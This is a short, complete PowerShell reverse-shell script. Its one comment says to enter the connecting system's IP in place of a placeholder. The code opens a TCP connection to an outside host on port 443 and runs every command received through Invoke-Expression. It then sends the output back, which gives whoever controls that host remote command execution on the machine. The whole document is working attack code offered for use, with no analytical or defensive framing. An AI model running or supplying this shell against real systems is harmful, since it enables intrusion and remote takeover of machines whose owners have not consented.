##PowerShell Reverse Shell
#Enter IP of system you are connecting to in place of x.x.x.x in the $client variable
$client = New-Object System.Net.Sockets.TcpClient('x.x.x.x',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|ForEach-Object{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (Invoke-Expression $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();